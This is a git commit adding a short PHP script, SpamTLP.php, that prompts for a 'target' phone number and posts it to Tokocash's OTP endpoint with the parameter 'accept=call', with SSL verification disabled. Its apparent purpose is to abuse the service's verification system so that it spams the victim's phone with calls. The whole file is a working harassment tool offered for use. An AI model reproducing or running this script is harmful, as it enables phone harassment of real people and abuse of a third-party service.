a3d5563453407f1955454754af7e4e5a8372bc5d
rizkycreatorcss <55630234+rizkycreatorcss@users.noreply.github.com>
2019-09-21 23:41:49 +0700

    Add files via upload

---
+++ SpamTLP.php
@@ -0,0 +1,21 @@
+<?php
+// RIZKY CREATOR CUSTOM /spam call
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "COPYRIGHT ; RIZKY CREATOR CUSTOM\n\n";
+echo "I hate school\n\n";
+echo "programer jail\n\n";
+echo "Nomor Target\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
